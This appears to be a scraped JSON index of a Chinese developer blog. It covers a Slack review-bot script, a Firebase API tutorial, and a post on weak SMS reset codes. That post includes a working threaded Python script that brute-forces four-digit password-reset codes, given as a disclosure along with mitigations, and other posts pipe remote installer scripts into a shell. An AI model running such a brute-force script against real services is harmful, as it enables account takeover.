v#{review[\"appVersionString\"]} - #{review[\"storeFront\"]} - #{date} - &lt;https://appstoreconnect.apple.com/apps/APP_ID/appstore/activity/ios/ratingsResponses|Go To App Store&gt;\" } payload = { :attachments =&gt; [attachments], :icon_emoji =&gt; \":storm_trooper:\", :username =&gt; \"ZhgChgLi iOS Review Bot\" }.to_json cmd = \"curl -X POST --data-urlencode 'payload=#{payload}' SLACK_WEB_HOOK_URL\" system(cmd, :err =&gt; File::NULL) puts \"#{review[\"id\"]} send Notify Success!\" endSLACK_WEB_HOOK_URL = Incoming WebHook URL最終結果appreviewbot.rb:require \"Spaceship\"require 'json'require 'date'# Config$slack_web_hook = \"目標通知的 web hook url\"$slack_debug_web_hook = \"機器人有錯誤時的通知 web hook url\"$appstore_account = \"APPStoreConnect 帳號(Email)\"$appstore_password = \"APPStoreConnect 密碼\"$app_id = \"APP_ID\"$platform = \"ios\"# Extension Spaceship-&gt;TunesClientmodule Spaceship class TunesClient &lt; Spaceship::Client def get_recent_reviews(app_id, platform, index) r = request(:get, \"ra/apps/#{app_id}/platforms/#{platform}/reviews?index=#{index}&amp;sort=REVIEW_SORT_ORDER_MOST_RECENT\") parse_response(r, 'data')['reviews'] end endend# Slack Botdef notify_slack(review) rating = review[\"rating\"].to_i color = rating &gt;= 4 ? \"good\" : (rating &gt;= 2 ? \"warning\" : \"danger\") like = review[\"helpfulViews\"].to_i &gt; 0 ? \" - #{review[\"helpfulViews\"]} :thumbsup:\" : \"\" date = review[\"edited\"] == false ? \"Created at: #{Time.at(review[\"lastModified\"].to_i / 1000).to_datetime}\" : \"Updated at: #{Time.at(review[\"lastModified\"].to_i / 1000).to_datetime}\" isResponse = \"\" if review[\"developerResponse\"] != nil &amp;&amp; review[\"developerResponse\"]['lastModified'] &lt; review[\"lastModified\"] isResponse = \" (客服回覆已過時)\" end edited = review[\"edited\"] == false ? \"\" : \":memo: 使用者更新評論#{isResponse}：\" stars = \"★\" * rating + \"☆\" * (5 - rating) attachments = { :pretext =&gt; edited, :color =&gt; color, :fallback =&gt; \"#{review[\"title\"]} - #{stars}#{like}\", :title =&gt; \"#{review[\"title\"]} - #{stars}#{like}\", :text =&gt; review[\"review\"], :author_name =&gt; review[\"nickname\"], :footer =&gt; \"iOS - v#{review[\"appVersionString\"]} - #{review[\"storeFront\"]} - #{date} - &lt;https://appstoreconnect.apple.com/apps/APP_ID/appstore/activity/ios/ratingsResponses|Go To App Store&gt;\" } payload = { :attachments =&gt; [attachments], :icon_emoji =&gt; \":storm_trooper:\", :username =&gt; \"ZhgChgLi iOS Review Bot\" }.to_json cmd = \"curl -X POST --data-urlencode 'payload=#{payload}' #{$slack_web_hook}\" system(cmd, :err =&gt; File::NULL) puts \"#{review[\"id\"]} send Notify Success!\" endbegin lastModified = 0 if File.exists?(\".lastModified\") lastModifiedFile = File.open(\".lastModified\") lastModified = lastModifiedFile.read.to_i end newLastModified = lastModified isFirst = true messages = [] index = 0 breakWhile = true while breakWhile app = Spaceship::Tunes::login($appstore_account, $appstore_password) reviews = app.get_recent_reviews($app_id, $platform, index) if reviews.length() &lt;= 0 breakWhile = false break end reviews.each { |review| index += 1 if isFirst isFirst = false newLastModified = review[\"value\"][\"lastModified\"] end if review[\"value\"][\"lastModified\"] &gt; lastModified &amp;&amp; lastModified != 0 # 第一次使用不發通知 messages.append(review[\"value\"]) else breakWhile = false break end } end messages.sort! { |a, b| a[\"lastModified\"] &lt;=&gt; b[\"lastModified\"] } messages.each { |message| notify_slack(message) } File.write(\".lastModified\", newLastModified, mode: \"w+\")rescue =&gt; error attachments = { :color =&gt; \"danger\", :title =&gt; \"AppStoreReviewBot Error occurs!\", :text =&gt; error, :footer =&gt; \"*因蘋果技術限制，精準評價爬取功能約每一個月需要重新登入設定，敬請見諒。\" } payload = { :attachments =&gt; [attachments], :icon_emoji =&gt; \":storm_trooper:\", :username =&gt; \"ZhgChgLi iOS Review Bot\" }.to_json cmd = \"curl -X POST --data-urlencode 'payload=#{payload}' #{$slack_debug_web_hook}\" system(cmd, :err =&gt; File::NULL) puts errorend另外還加上了 begin…rescue (try…catch) 保護，如果有出現錯誤則發 Slack 通知我們回來檢查（多半是 session 過期）。 最後只要將此腳本加到 crontab / schedule 等排程工具定時執行即可！效果圖：免費的其他選擇 AppFollow ：使用 Public URL API (RSS)，只能說堪用吧。 feedis.io ：使用 Private URL API，需要把帳號密碼給他們。 TradeMe/ReviewMe ：自架服務(node.js)，我們原先用這個，但遇到前述問題。 JonSnow ：自架服務(GO)，支援一鍵部署到 heroku，作者： @saiday溫馨提示1.⚠️Private URL API 方法，如果用有二階段驗證的帳號，最長每 30 天都需要重新驗證才能使用且目前無解；如果有辦法生出沒二階段的帳號就可以無痛爽爽用。#important-note-about-session-duration2.⚠️不論是免費、付費、本文的自架；切勿使用開發者帳號，務必開一個獨立的 App Store Connect 帳號使用，權限只開放「Customer Support」；防止資安問題。3.Ruby 建議使用 rbenv 進行管理，因系統自帶 2.6 版容易造成衝突。4.在 macOS Catalina 如遇到 GEM、Ruby 環境錯誤問題，可參考 此回覆 解決。Problem Solved!經過以上心路歷程，更瞭解的 Slack Bot 的運作方式；還有 iOS App Store 是如何爬取評價內容的，另外也摸了下 ruby！寫起來真不錯！有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 964 Total Views Last Statistics Date: 2025-01-19 | 879 Views on Medium. " }, { "title": "使用 Firebase Firestore + Functions 快速搭建可供測試的 API 服務", "url": "/posts/9659db1357e4/", "categories": "ZRealm Dev.", "tags": "ios-app-development, firebase, google-cloud-platform, notifications, ios", "date": "2021-03-24 01:09:34 +0800", "snippet": "使用 Firebase Firestore + Functions 快速搭建可供測試的 API 服務當推播統計遇上 Firebase Firestore + FunctionsPhoto by Carlos Muza前言推播精確統計功能最近想為 APP 導入的功能，未實作前我們只能從後端 Post 資料給 APNS/FCM 的成功與否當作推播基數並記錄推播點擊，計算出「點擊率」；但此方法其實...", "content": "使用 Firebase Firestore + Functions 快速搭建可供測試的 API 服務當推播統計遇上 Firebase Firestore + FunctionsPhoto by Carlos Muza前言推播精確統計功能最近想為 APP 導入的功能，未實作前我們只能從後端 Post 資料給 APNS/FCM 的成功與否當作推播基數並記錄推播點擊，計算出「點擊率」；但此方法其實非常不準確，基數包含許多無效裝置，APP 已刪除的（不一定會馬上失效）、關閉推播權限的在後端 Post 時都還是會得到成功的回傳。在 iOS 10 之後可以透過實踐 Notification Service Extension 在推播橫幅出現時的時機點偷偷 Call API 回傳做統計；好處是非常精準，只有在使用者推播橫幅有出現才會 Call；如果 APP 刪除、關閉通知、通知沒開橫幅，都不會有動作，橫幅等於有出現推播訊息，用此當推播基數然後再算上點擊數就能得到「精確的點擊率」。 詳細原理及實作方式可參考之前的文章：「 i OS ≥ 10 Notification Service Extension 應用 (Swift) 」 目前測試下來 APP 的 Loss 率應該是 0%，實際常見應用像是 Line 的訊息點對點加解密（推播的訊息是加密過的，在手機收到才解密然後顯示出來）。問題APP 端的功其實不大，iOS/Android 都只要實作類似的功能（但 Android 如果要考慮中國市場就比較麻煩，要為更平台實作推播框架內容）；比較大的功是後端還有 Server 的壓力處理，因為推播一次出去會同時 Call API 回傳紀錄，可能會塞爆 Server 的 max connection 如果又是使用 RDBMS 儲存記錄可能會更嚴重，如果發現統計數有 Loss 多半發生在此環節。 這邊可以以 log 寫檔案方式做紀錄，要查詢時在自行做統計顯示。 另外，後來想想一次出去同時回來的情境，數量可能沒有想像中的大；因為發推播也不會一口氣發個十萬百萬筆，也是幾筆幾筆批次發送；只要能扛住批次發出去同時回來的數量即可！Prototype因原先有問題中的考量，後端需要花功力研究修改且市場也不一定在意做出來的成效；所以想說先用能使用的資源弄個 Prototype 出來試試水溫。這邊選擇的是 APP 幾乎都會使用的 Firebase 服務，其中的 Functions 和 Firestore 功能。Firebase FunctionsFunctions 是 Google 提供的 serverless 服務，只需撰寫好程式邏輯，Google 自動幫你弄好伺服器、執行環境，也不用去管伺服器擴充及流量的問題。Firebase Functions 其實就是 Google Cloud Functions 但只能使用 JavaScript (node.js) 撰寫，沒試過但如果用 Google Cloud Functions 選擇用其他語言撰寫然後同樣 import Firebase 服務我想應該也能用。用在 API 就是我可以寫一個 node.js 檔案，得到一個實體 URL (ex: my-project.cloudfunctions.net/getUser)，自行撰寫取得 Request 資訊和給予相應的 Response 邏輯。 之前寫過一篇關於 Google Functions 的文章「 使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事 」 Firebase Functions 必須啟用 Blaze 專案（用多少、付多少）才能使用。Firebase FirestoreFirebase Firestore ，NoSql 資料庫，用來存放、管理數據。結合 Firebase Functions 可在 Request 時 import Firestore 進來操作資料庫，然後Response 給使用者，就能搭建簡單的 Restful API 服務！ 動手實作開始！安裝 node.js 環境這邊建議使用 NVM，node.js 版本管理工具進行安裝管理（像 python 用 pyenv）。到 NVM Github 專案複製安裝 shell script：curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.37.2/install.sh | bash如果安裝過程出現錯誤，請確認有 ~/.bashrc 或 ~/.zshrc 檔案，沒有可用 touch ~/.bashrc 或 touch ~/.zshrc 建立檔案然後再跑一下 install script。再來就可以使用 nvm install node 安裝最新版的 node.js。可下 npm --version 確認 npm 安裝成功、安裝版本：部署 Firebase Functions安裝 Firebase-tools：npm install -g firebase-tools安裝成功後，第一次使用請先輸入：firebase login完成 Firebase 登入驗證。啟動專案：firebase init記下 Firebase init 所在路徑：You're about to initialize a Firebase project in this directory:這邊可以選擇要安裝的 Firebase CLI 工具，按 「↑」「↓」進行選擇，「空白鍵」進行選擇；這邊可以只選擇「Functions」或連「Firestore」一起選擇安裝。=== Functions Setup 語言選擇「 JavaScript 」 關於「use ESLint to catch probable bugs and enforce style」語法 style 檢查 ， YES / NO 都可 。 install dependencies with npm? YES===Emulators Setup可在本地環境測試 Functions、Firestore 功能及設定，不會算在使用度且不需等到部署上線才能測試。 依個人需求安裝，我有裝但沒有用．．．因為只是小功能而已。Coding!前往上述記下的路徑，找到 functions 資料夾 ，用編輯器打開裡面的 index.js 檔案。index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');admin.initializeApp();exports.hello = functions.https.onRequest((req, res) =&gt; { const targetID = req.query.targetID const action = req.body.action const name = req.body.name res.send({\"targetID\": targetID, \"action\": action, \"name\": name}); return})貼上以上內容，我們定義了一個路徑接口 /hello 然後會回傳 URL Query ?targetID= 、 POST action 、 name 參數資訊。修改＆儲存完成後回到 console 下：firebase deploy 以後的每次修改都記得要回來下 firebase deploy 指令，才會生效。開始驗證＆部署到 Firebase…可能需要稍等一下， Deploy complete! 後你的第一個 Request &amp; Response 網頁就完成了！這時候可以回到 Firebase -&gt; Functions 頁面：就會看到剛剛撰寫的接口和網址位置。複製下方網址貼到 PostMan 測試： POST Body 記得選擇 x-www-form-urlencoded 。成功！Log我們可以在程式碼中使用：functions.logger.log(\"log:\", value);進行 Log 紀錄。並可在 Firebase -&gt; Functions -&gt; 紀錄中查看 log 結果：Example Goal 建立一個可新增、修改、刪除、查詢文章和按讚的 API我們希望能達成 Restful API 的功能設計，所以不能再使用上面範例的純 Path 方式，要改藉用 Express 框架達成。POST 新增文章index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Insertapp.post('/', async (req, res) =&gt; { // 這邊的 POST 指的是 HTTP Method POST const title = req.body.title; const content = req.body.content; const author = req.body.author; if (title == null || content == null || author == null) { return res.status(400).send({\"message\":\"參數錯誤！\"}); } var post = {\"title\":title, \"content\":content, \"author\": author, \"created_at\": new Date()}; await admin.firestore().collection('posts').add(post); res.status(201).send({\"message\":\"新增成功！\"});});exports.post= functions.https.onRequest(app); // 這邊的 POST 指的是 /post 路徑現在我們改用 Express 來處理網路請求，這邊先新增一個 路徑 / 的 POST 方法，最後一行表示路徑都在 /post 之下，再來我們會加上修改、刪除的 API。下 firebase deploy 部署成功後，回到 Post Man 測試：Post Man 打成功後可以再到 Firebase -&gt; Firestore 檢查一下資料是否有正確寫入：PUT 修改文章index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Updateapp.put(\"/:id\", async (req, res) =&gt; { const title = req.body.title; const content = req.body.content; const author = req.body.author; const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } else if (title == null || content == null || author == null) { return res.status(400).send({\"message\":\"參數錯誤！\"}); } var post = {\"title\":title, \"content\":content, \"author\": author}; await admin.firestore().collection('posts').doc(req.params.id).update(post); res.status(200).send({\"message\":\"修改成功！\"});});exports.post= functions.https.onRequest(app);部署＆測試方式如新增，Post Man Http Method 記得改成 PUT 。DELETE 刪除文章index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Deleteapp.delete(\"/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } await admin.firestore().collection(\"posts\").doc(req.params.id).delete(); res.status(200).send({\"message\":\"文章成功！\"});})exports.post= functions.https.onRequest(app);部署＆測試方式如新增，Post Man Http Method 記得改成 DELETE 。新增、修改、刪除做完了，來做查詢！SELECT 查詢文章index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Select Listapp.get('/', async (req, res) =&gt; { const posts = await admin.firestore().collection('posts').get(); var result = []; posts.forEach(doc =&gt; { let id = doc.id; let data = doc.data(); result.push({\"id\":id, ...data}) }); res.status(200).send({\"result\":result});});// Select Oneapp.get(\"/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } res.status(200).send({\"result\":{\"id\":doc.id, ...doc.data()}});});exports.post= functions.https.onRequest(app);部署＆測試方式如新增，Post Man Http Method 記得改成 GET 還有將 Body 切回 none 。InsertOrUpdate?有時候我們需要當值存在時做更新，當值不存在時新增，這時候可以用 set 搭配 merge: true ：index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// InsertOrUpdateapp.post(\"/tag\", async (req, res) =&gt; { const name = req.body.name; if (name == null) { return res.status(400).send({\"message\":\"參數錯誤！\"}); } var tag = {\"name\":name}; await admin.firestore().collection('tags').doc(name).set({created_at: new Date()}, {merge: true}); res.status(201).send({\"message\":\"新增成功！\"});});exports.post= functions.https.onRequest(app);這邊以新增 tag 為例，部署＆測試方式如新增，可以看到 Firestore 不會一直重複新增新資料。文章按讚計數器假設我們的文章資料現在多一個 likeCount 欄位紀錄按讚數量，那我們該怎麼做呢？index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Like Postapp.post(\"/like/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); const increment = admin.firestore.FieldValue.increment(1) if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } await admin.firestore().collection('posts').doc(req.params.id).set({likeCount: increment}, {merge: true}); res.status(201).send({\"message\":\"按讚成功！\"});});exports.post= functions.https.onRequest(app);運用 increment 這個變數就能直接做到取出值 +1 的動作。大流量文章按讚計數器因為 Firestore 有 寫入速度限制 的：一個文檔一秒只能寫入一次 ，所以當按讚的人一多；同時請求下可能會變得很慢。官方給的解決方法「 Distributed counters 」其實也沒什麼高深的技術，就是多用幾個分散的 likeCount 欄位來統計，然後讀取的時候再加總起來。index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Distributed counters Like Postapp.post(\"/like2/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); const increment = admin.firestore.FieldValue.increment(1) if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } //1~10 await admin.firestore().collection('posts').doc(req.params.id).collection(\"likeCounter\").doc(\"likeCount_\"+(Math.floor(Math.random()*10)+1).toString()) .set({count: increment}, {merge: true}); res.status(201).send({\"message\":\"按讚成功！\"});});exports.post= functions.https.onRequest(app);以上就是分散出欄位來紀錄 Count 避免寫入太慢；但如果分散的欄位太多會增加讀取成本($$)，但應該還是比每次按讚都 add 一筆新紀錄還便宜。使用 Siege 工具進行壓力測試使用 brew 安裝 siegebrew install siegep.s 如果你出現 brew: command not found 請先安裝 brew 套件管理工具 ：/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"安裝完成後可下：siege -c 100 -r 1 -H 'Content-Type: application/json' 'https://us-central1-project.cloudfunctions.net/post/like/id POST {}'進行壓力測試： -c 100 ：100 個任務同步執行 -r 1 ：每個任務執行 1 次請求 -H ‘Content-Type: application/json’ ：如果是 POST 時需加上 ‘https://us-central1-project.cloudfunctions.net/post/like/id POST {}’ ：POST 網址、Post Body (ex: {“name”:”1234”} )執行完成後可看到執行結果：successful_transactions: 100 表示 100 次都執行成功。可以回 Firebase -&gt; Firestore 查看結果是否有 Loss Data： 成功！完整 Example Codeindex.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));// Insertapp.post('/', async (req, res) =&gt; { const title = req.body.title; const content = req.body.content; const author = req.body.author; if (title == null || content == null || author == null) { return res.status(400).send({\"message\":\"參數錯誤！\"}); } var post = {\"title\":title, \"content\":content, \"author\": author, \"created_at\": new Date()}; await admin.firestore().collection('posts').add(post); res.status(201).send({\"message\":\"新增成功！\"});});// Updateapp.put(\"/:id\", async (req, res) =&gt; { const title = req.body.title; const content = req.body.content; const author = req.body.author; const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } else if (title == null || content == null || author == null) { return res.status(400).send({\"message\":\"參數錯誤！\"}); } var post = {\"title\":title, \"content\":content, \"author\": author}; await admin.firestore().collection('posts').doc(req.params.id).update(post); res.status(200).send({\"message\":\"修改成功！\"});});// Deleteapp.delete(\"/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } await admin.firestore().collection(\"posts\").doc(req.params.id).delete(); res.status(200).send({\"message\":\"文章成功！\"});});// Select Listapp.get('/', async (req, res) =&gt; { const posts = await admin.firestore().collection('posts').get(); var result = []; posts.forEach(doc =&gt; { let id = doc.id; let data = doc.data(); result.push({\"id\":id, ...data}) }); res.status(200).send({\"result\":result});});// Select Oneapp.get(\"/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } res.status(200).send({\"result\":{\"id\":doc.id, ...doc.data()}});});// InsertOrUpdateapp.post(\"/tag\", async (req, res) =&gt; { const name = req.body.name; if (name == null) { return res.status(400).send({\"message\":\"參數錯誤！\"}); } var tag = {\"name\":name}; await admin.firestore().collection('tags').doc(name).set({created_at: new Date()}, {merge: true}); res.status(201).send({\"message\":\"新增成功！\"});});// Like Postapp.post(\"/like/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); const increment = admin.firestore.FieldValue.increment(1) if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } await admin.firestore().collection('posts').doc(req.params.id).set({likeCount: increment}, {merge: true}); res.status(201).send({\"message\":\"按讚成功！\"});});// Distributed counters Like Postapp.post(\"/like2/:id\", async (req, res) =&gt; { const doc = await admin.firestore().collection('posts').doc(req.params.id).get(); const increment = admin.firestore.FieldValue.increment(1) if (!doc.exists) { return res.status(404).send({\"message\":\"找不到文章！\"}); } //1~10 await admin.firestore().collection('posts').doc(req.params.id).collection(\"likeCounter\").doc(\"likeCount_\"+(Math.floor(Math.random()*10)+1).toString()) .set({count: increment}, {merge: true}); res.status(201).send({\"message\":\"按讚成功！\"});});exports.post= functions.https.onRequest(app);回歸主題，推播統計回到一開始我們想做的，推播統計功能。index.js:const functions = require('firebase-functions');const admin = require('firebase-admin');const express = require('express');const cors = require('cors');const app = express();admin.initializeApp();app.use(cors({ origin: true }));const vaildPlatformTypes = [\"iOS\",\"Android\"]const vaildActionTypes = [\"clicked\",\"received\"]// Insert Logapp.post('/', async (req, res) =&gt; { const increment = admin.firestore.FieldValue.increment(1); const platformType = req.body.platformType; const pushID = req.body.pushID; const actionType = req.body.actionType; if (!vaildPlatformTypes.includes(platformType) || pushID == undefined || !vaildActionTypes.includes(actionType)) { return res.status(400).send({\"message\":\"參數錯誤！\"}); } else { await admin.firestore().collection(platformType).doc(actionType+\"_\"+pushID).collection(\"shards\").doc((Math.floor(Math.random()*10)+1).toString()) .set({count: increment}, {merge: true}) res.status(201).send({\"message\":\"紀錄成功！\"}); }});// View Logapp.get('/:type/:id', async (req, res) =&gt; { // received const receivedDocs = await admin.firestore().collection(req.params.type).doc(\"received_\"+req.params.id).collection(\"shards\").get(); var received = 0; receivedDocs.forEach(doc =&gt; { received += doc.data().count; }); // clicked const clickedDocs = await admin.firestore().collection(req.params.type).doc(\"clicked_\"+req.params.id).collection(\"shards\").get(); var clicked = 0; clickedDocs.forEach(doc =&gt; { clicked += doc.data().count; }); res.status(200).send({\"received\":received,\"clicked\":clicked});});exports.notification = functions.https.onRequest(app);新增推播紀錄檢視推播統計數字https://us-centra1-xxx.cloudfunctions.net/notification/iOS/1另外也做了個介面統計推播數字。踩坑 因為對 node.js 用法不太熟悉，一開始摸索的時候在 add 資料時沒加上 await 再加上寫入速度限制，導致在大流量情況下會 Data Loss…Pricing別忘了參考 Firebase Functions &amp; Firestore 的定價策略。Functions https://cloud.google.com/functions/pricing?hl=zh-tw運算時間網路 Cloud Functions 針對運算時間資源提供永久免費方案，當中包含 GB/秒和 GHz/秒的運算時間。除了 200 萬次叫用以外，免費方案也提供 400,000 GB/秒和 200,000 GHz/秒的運算時間，以及每月 5 GB 的網際網路輸出流量。Firestore https://cloud.google.com/firestore/pricing?hl=zh-tw 計算範例 價格可能隨時更改，請以官網最新資訊為準。結論如同標題所寫「可供測試」、「可供測試」、「可供測試」不太建議將以上服務用於正式環境，甚至當作產品的核心上線。收費貴、難遷移之前曾聽說某個蠻大的服務就是使用 Firebase 服務搭建起家，結果後期資料、流量大，收費爆貴；要轉移也很困難，程式還好但資料非常難搬；只能說是初期省了小錢卻造成後期巨大的虧損，不值得。僅供測試因為以上原因，使用 Firebase Functions + Firestore 搭建的 API 服務個人建議僅供測試或是 Prototype 產品展示。更多功能Functions 還可以串 Authentication(身份驗證)、Storage(檔案上傳)，但這部分我就沒研究了。參考資料 https://firebase.google.com/docs/firestore/query-data/queries https://coder.tw/?p=7198 https://firebase.google.com/docs/firestore/solutions/counters#node.js_1 https://javascript.plainenglish.io/firebase-cloud-functions-tutorial-creating-a-rest-api-8cbc51479f80延伸閱讀 使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事 i OS ≥ 10 Notification Service Extension 應用 (Swift) 運用 Google Apps Script 轉發 Gmail 信件到 Slack有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 2,974 Total Views Last Statistics Date: 2025-01-19 | 2,894 Views on Medium. " }, { "title": "找回密碼之簡訊驗證碼強度安全問題", "url": "/posts/99a6cef90190/", "categories": "ZRealm Dev.", "tags": "ios-app-development, hacker, web-security, password-security, security-token", "date": "2021-03-14 23:57:38 +0800", "snippet": "找回密碼之簡訊驗證碼強度安全問題使用 Python 展示暴力破解的嚴重性Photo by Matt Artz前言本文沒什麼資安技術含量，單純是日前在使用某平台網站時的突發奇想；想說順手測看看安全性，結果發現的問題。在使用網站、APP 服務的忘記密碼找回功能時；一般會有兩個選項，一是輸入帳號、Email，然後會寄含有 Token 的重設密碼頁面連結到信箱，點擊後打開頁面就能重設密碼，這部分沒什...", "content": "找回密碼之簡訊驗證碼強度安全問題使用 Python 展示暴力破解的嚴重性Photo by Matt Artz前言本文沒什麼資安技術含量，單純是日前在使用某平台網站時的突發奇想；想說順手測看看安全性，結果發現的問題。在使用網站、APP 服務的忘記密碼找回功能時；一般會有兩個選項，一是輸入帳號、Email，然後會寄含有 Token 的重設密碼頁面連結到信箱，點擊後打開頁面就能重設密碼，這部分沒什麼問題，除非像 之前那篇 文章所說，設計上有漏洞才會有問題。另一個找回密碼的方式是輸入綁定的手機號碼（多半用在 APP 服務），然後會寄出簡訊驗證碼到手機，完成驗證碼輸入即可重設密碼；但為了便利性，多半的服務都是使用純數字作為驗證碼，另外也因為在 iOS ≥ 11 之後增加 Password AutoFill 功能，當手機收到驗證碼後鍵盤會自動判讀並跳出提示。查找 官方文件 ，蘋果並沒有給出驗證碼自動填入的判讀格式規則；但我看幾乎所有能支援自動填入的服務都是使用純數字，推測應該是只能用數字不能使用數字英文夾雜的複雜組合。問題因數字密碼的組合存在暴力破解的可能性，尤其是 4 位密碼；組合只有 0000~9999，10,000 種組合；使用多個 thread 多台機器就能分組暴力破解。假設驗證請求需要 0.1 秒回應，10,000 個組合 = 10,000 次請求破解所需嘗試時間：((10,000 * 0.1) / thread 數) 秒就算不開 thread 也只需要 16 多分種就能嘗試出正確的簡訊驗證碼。 除密碼長度、複雜度不足之外，還有個問題是驗證碼未設嘗試上限、有效期限太長這兩個問題。組合綜合上述，此資安問題常見於 APP 端；因網頁服務多半都會在嘗試錯誤多次後加上圖形驗證碼驗證或在請求重設密碼時需多輸入安全問題，增加發送驗證請求的困難度；另外網頁服務的驗證若沒有前後端分離，變成每次驗證請求都要拿整個網頁，拉長請求回應時間。APP 端因流程設計及方便使用者，多半會簡化重設密碼流程、有的 APP 甚至是通過手機號碼驗證就能登入；如果在 API 端沒有做防護則會造成資安漏洞。實踐 ⚠️警告⚠️ 本文僅作展示此安全問題的嚴重性，請勿拿去做壞事。嗅探驗證請求 API萬事都從嗅探開始，這部分可參考之前的文章「 APP有用HTTPS傳輸，但資料還是被偷了。 」、「 使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事 」第一篇文章看原理建議使用第二篇文章的 Proxyman 進行嗅探。如果是前後端分離的網站服務也能使用 Chrome -&gt; 檢查 -&gt; Network -&gt; 查看在送出驗證碼後發了什麼請求。這邊假設得到的檢查驗證碼請求是：POST https://zhgchg.li/findPWDResponse：{ \"status\":fasle \"msg\":\"驗證錯誤\"}撰寫暴力破解 Python 腳本crack.py:import randomimport requestsimport jsonimport threadingphone = \"0911111111\"found = Falsedef crack(start, end): global found for code in range(start, end): if found: break stringCode = str(code).zfill(4) data = { \"phone\" : phone, \"code\": stringCode } headers = {} try: request = requests.post('https://zhgchg.li/findPWD', data = data, headers = headers) result = json.loads(request.content) if result[\"status\"] == True: print(\"Code is:\" + stringCode) found = True break else: print(\"Code \" + stringCode + \" is wrong.\") except Exception as e: print(\"Code \"+ stringCode +\" exception error \\(\" + str(e) + \")\")def main(): codeGroups = [ [0,1000],[1000,2000],[2000,3000],[3000,4000],[4000,5000], [5000,6000],[6000,7000],[7000,8000],[8000,9000],[9000,10000] ] for codeGroup in codeGroups: t = threading.Thread(target = crack, args = (codeGroup[0],codeGroup[1],)) t.start()main()執行腳本後我們得到：驗證碼等於：1743將 1743 帶入重設密碼更改掉原始密碼或直接登入帳號。 Bigo!解決之道 密碼重設增加更多資訊驗證（如：生日、安全問題） 增加驗證碼長度（如 Apple 6 碼數字）、增加驗證碼複雜度（如果不影響 AutoFill 功能） 驗證碼嘗試錯誤大於 3 次後使其失效，需請使用者重新發送驗證碼 驗證碼有效時限縮短 驗證碼嘗試錯誤過多次鎖定裝置、增加圖形驗證碼 APP 多做 SSL Pining、傳輸加解密（防止嗅探）延伸閱讀 揭露一個幾年前發現的巧妙網站漏洞 如何打造一場有趣的工程CTF競賽 APP有用HTTPS傳輸，但資料還是被偷了。 使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 1,220 Total Views Last Statistics Date: 2025-01-19 | 1,185 Views on Medium. " }, { "title": "Bye Bye 2020 經營 Medium 第二年回顧", "url": "/posts/5ea3311119d8/", "categories": "ZRealm Life.", "tags": "生活, ｍedium, blog, ios, taiwan", "date": "2021-02-24 20:59:41 +0800", "snippet": "Bye Bye 2020 經營 Medium 第二年回顧遲到遲到再遲到的 2020 回顧圖片取自 2020 年擔任 iOS Developer 的服務單位 — 街聲 — 簡單生活節官方海報 2018–2019 第一年的回顧在這。艱難的一年無關工作，2020 對我來說是艱難的一年；經歷了許多重大挫折，不過還好，都挺過去了。我只想說一句： 人，要學會珍惜當下、珍惜自己所擁有的。工作回到工作上...", "content": "Bye Bye 2020 經營 Medium 第二年回顧遲到遲到再遲到的 2020 回顧圖片取自 2020 年擔任 iOS Developer 的服務單位 — 街聲 — 簡單生活節官方海報 2018–2019 第一年的回顧在這。艱難的一年無關工作，2020 對我來說是艱難的一年；經歷了許多重大挫折，不過還好，都挺過去了。我只想說一句： 人，要學會珍惜當下、珍惜自己所擁有的。工作回到工作上，2020 突破舒適圈進入新的環境；讓我接觸到許多新鮮事，吸收了很多 iOS 